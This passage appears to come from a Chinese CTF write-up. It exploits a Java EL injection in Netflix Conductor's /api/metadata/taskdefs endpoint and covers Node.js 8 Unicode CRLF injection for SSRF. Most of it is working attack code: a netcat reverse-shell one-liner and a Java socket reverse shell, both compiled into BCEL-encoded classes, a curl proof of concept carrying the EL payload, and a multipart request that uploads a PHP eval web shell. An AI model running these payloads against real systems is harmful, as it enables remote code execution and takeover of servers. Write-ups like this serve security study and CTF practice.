<p>下一步继续关注 <code>TaskTimeoutConstraint.java</code> 在哪被使用，定位到 <code>common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java</code> 文件，其实也有多处引用，。找漏洞利用点的大佬辛苦了~</p>
<p><img src="/img/2021hfctf/image-20210422185744001.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185744001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185744001"></p>
<p>可以看到 <code>TaskTimeoutConstraint</code> 注解到了 <code>TaskDef</code> 类上，那么下一步进行看 <code>TaskDef</code> 类会在哪里被使用，继续搜索全局引用，可以看到 <code>jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java</code> 会<br>把该类和路由 <code>/api/metadata/taskdefs</code> 绑定，即我们通过请求该路由，即可获得 <code>TaskDef</code> 对象。</p>
<p><img src="/img/2021hfctf/image-20210422190049360.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422190049360.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422190049360"></p>
<p><a target="_blank" rel="noopener" href="https://netflix.github.io/conductor/labs/beginner/">https://netflix.github.io/conductor/labs/beginner/</a></p>
<p>官方给出的访问 API 稍微修改后如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;verify_if_idents_are_added&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所以漏洞最终的利用逻辑如下：</p>
<ol>
<li>通过 POST 请求访问 URL <code>/api/metadata/taskdefs</code> 创建 <code>TaskDef</code> 对象</li>
<li>根据官方API给出的demo稍微修改后，参数中的 <code>timeoutSeconds</code> 和 <code>responseTimeoutSeconds</code> 满足了 <code>taskDef.getTimeoutSeconds() &gt; 0</code> 以及 <code>taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds()</code> 这两个条件，<code>TaskTimeoutValidator</code> 校验失败，<code>TaskDef</code> 的 <code>name</code> 属性作为错误信息的一部分通过 <code>buildConstraintViolationWithTemplate(0)</code> 输出</li>
<li>由于 <code>name</code> 是我们构造好的 Java EL 表达式，所以最后该表达式会被执行，进而成功触发远程代码执行</li>
</ol>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>还自带 docker-compose.yaml 也太贴心了吧 （</p>
<p>由于刚刚下载的就是2.25.0版本，所以直接切到 docker 目录，在 up 一下就好</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> docker</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>如果期间有下载错误啥的，可以尝试代理或者 up 多几下。</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>无论下面是自己写 BCEL 还是 直接用现有的工具，都要注意 Java的版本，我本地用的是 1.8.0_144 版本。</p>
<p>这里还篇有趣的文章，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a> ，我感觉和这个有关，2333</p>
<p>据网上看，好像保证 Java 版本 &lt; Java 8u261 即可。</p>
<h5 id="自己写一个，熟悉一下BCEL"><a href="#自己写一个，熟悉一下BCEL" class="headerlink" title="自己写一个，熟悉一下BCEL"></a>自己写一个，熟悉一下BCEL</h5><p>依赖下载地址：</p>
<p><a target="_blank" rel="noopener" href="https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/">https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/</a></p>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(Exp.class);</span><br><span class="line">        String code = Utility.encode(cls.getBytes(), <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Exp.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;监听IP&gt; &lt;监听端口&gt; &gt;/tmp/f&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个POC我在本机可以打成功，但是通过 curl 打实际docker环境 shell 就反弹不回来，然后也试了各种方法 sh 反弹方法，毕竟是 docker最简环境嘛，一般里面除了 sh 能用其他基本没啥了。</p>
<p>然后突然想起之前看到这篇<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8f80Fezs86DD9R1iRqLhMg">酒仙桥的文章</a>，他遇到的情形和我一样。然后通过 java 编写 socket 的思路来反弹shell，这样可以不依赖于具体的系统环境。</p>
<p>真 Exp.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String host=<span class="string">&quot;&quot;</span>; <span class="comment">// // nc监听IP</span></span><br><span class="line">        <span class="keyword">int</span> port=; <span class="comment">// nc监听端口，注意是整型不是字符串</span></span><br><span class="line">        String cmd=<span class="string">&quot;/bin/sh&quot;</span>; <span class="comment">// 如果是 windows 就换成 cmd.exe</span></span><br><span class="line">        Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">        Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();</span><br><span class="line">        OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed())&#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然可以不反弹shell，可以通过 wget 之类的方式下载到本地在加载，</p>
<p>不过就是想复现一下，万一以后遇到了 HTTP 不出网呢 （</p>
<p>结构如下</p>
<p><img src="/img/2021hfctf/image-20210423151406429.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151406429.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151406429"></p>
<p>BCEL编码后的恶意代码</p>
<p><img src="/img/2021hfctf/image-20210423151446165.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151446165.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151446165"></p>
<h5 id="直接用现有工具"><a href="#直接用现有工具" class="headerlink" title="直接用现有工具"></a>直接用现有工具</h5><p><a target="_blank" rel="noopener" href="https://github.com/f1tz/BCELCodeman">https://github.com/f1tz/BCELCodeman</a></p>
<p>也是先写好 exp，然后 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java -d /tmp/Exp.class</span><br></pre></td></tr></table></figure>

<p>BCEL编码后的恶意代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BCELCodeman.jar e /tmp/Exp.class</span><br></pre></td></tr></table></figure>

<p><img src="/img/2021hfctf/image-20210423150859893.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423150859893.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423150859893"></p>
<h5 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h5><p>得到编码后构造 POC ，主要是替换 name 部分为 EL表达式，内容为 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载器加载BCEL编码后的恶意代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;$&#123;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;.getClass().forName(&#x27;</span>\<span class="string">&#x27;&#x27;</span>com.sun.org.apache.bcel.internal.util.ClassLoader<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().loadClass(&#x27;</span>\<span class="string">&#x27;&#x27;</span>&lt;刚刚生成的BCEL编码&gt;<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().class&#125;&quot;,</span></span><br><span class="line"><span class="string">  &quot;ownerEmail&quot;: &quot;test@example.org&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure>



<p><img src="/img/2021hfctf/image-20210423162810488.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162810488.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162810488"></p>
<p>成功反弹shell</p>
<p><img src="/img/2021hfctf/image-20210423162419172.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162419172.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162419172"></p>
<blockquote>
<p>根据漏洞相关的 pull requests：<a target="_blank" rel="noopener" href="https://github.com/Netflix/conductor/pull/1543">https://github.com/Netflix/conductor/pull/1543</a> 可以定位对该漏洞的修复</p>
<p>开发者将 <code>org.hibernate:hibernate-validator</code> 替换为了 <code>org.apache.bval:bval-jsr</code>，而后者在最新版本下不会解析 Java EL 表达式，所以也不会有 RCE 的危险。</p>
</blockquote>
<p>好，本地复现成功，把这个 POC 直接打线上，估计问题不大</p>
<h3 id="回到题目中"><a href="#回到题目中" class="headerlink" title="回到题目中"></a>回到题目中</h3><p>现在漏洞是可以尝试去利用了，问题是，题目只提供 GET 的代理，无法发送 POST 请求。</p>
<p>继续沿着一开始的思路走，CRLF SSRF</p>
<p>guguru了一下，nodejs CRLF 漏洞，发现还真有2333</p>
<p>这篇写的比较详细，跟着复现一下</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA">https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA</a></p>
<p>然后看了别人的复现，发现有一个比较隐秘的提示。。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br></pre></td></tr></table></figure>

<p>中间藏了个 8，， nodejs8 is best，2333 不过不伤大雅，眼睛不好网上搜一下也可以知道 nodejs HTTP库包含了阻止CRLF的措施，普通 CRLF不管用，但可以通过 nodejs 的设计不严谨问题来绕过。当然这个问题在 nodejs10 被修复了，如果请求路径包含非Ascii字符，则会抛出错误。</p>
<h3 id="nodejs-lt-9版本-CRLF注入"><a href="#nodejs-lt-9版本-CRLF注入" class="headerlink" title="nodejs &lt; 9版本 CRLF注入"></a>nodejs &lt; 9版本 CRLF注入</h3><p>对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p>
<ul>
<li>接受来自用户输入的Unicode数据</li>
<li>并将其包含在HTTP请求的路径中</li>
<li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>）</li>
</ul>
<p>由于本机是 node10+，所以docker拉个镜像，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull node:8.8.0-alpine</span><br></pre></td></tr></table></figure>



<p>进入容器的node环境，然后试试普通的 CRLF</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # node</span><br><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\r\nwhoami&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0Awhoami HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p>返回包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /%0D%0Awhoami HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>



<p>nodejs Unicode 字符损失原理</p>
<p>当 Node.js v8 或更低版本对URL发出的 <code>GET</code> 请求进行处理时，它不会进行编码转义，因为它们不是HTTP控制字符，但HTTP请求返回的结果中会被编码为 <code>latin1</code> 编码写入路径，但 latin1 编码为单字节编码（编码范围为 <code>0x00</code> - <code>0xFF</code> ，其中 <code>0x00</code> - <code>0x7F</code>之间完全和ASCII一致，<code>0x80</code> - <code>0x9F</code>之间是控制字符，<code>0xA0</code> - 0xFF之间是文字符号 ），如果此时我们用单字节 8位 Unicode 编码，那么高 4 位会被截断。</p>
<p>构造请求</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\u&#123;220D&#125;\u&#123;330A&#125;tari&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /∍㌊tari HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p>返回包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /</span><br><span class="line">tari HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>



<p>观察 <code>\u&#123;220D&#125;</code> 和 <code>\u&#123;330A&#125;</code> ，其中 <code>22</code> 和 <code>33</code> 随意，什么都行，因为最终高 4 位都会被截断，然后 <code>0D</code> 和 <code>0A</code> 分别为 <code>\r</code> 和 <code>\n</code> 的 ASCII码，然后Latin1是向下兼容ASCII码的，所以返回包被 <code>\r\n</code> 截断了， <code>tari</code> 变在第二行</p>
<p>可见，可以通过构造 Unicode字符，在 nodejs 实现 CRLF注入。</p>
<p>在实际使用时，因为 CRLF + SSRF 点 在 HTTP 状态行，所以要注意闭合原有的状态行中的 <code>HTTP/1.1</code>，即保证注入后有正常的 HTTP 状态行，</p>
<p>先举个例子，假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="number">100000</span></span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">Upload</span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure>

<p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php 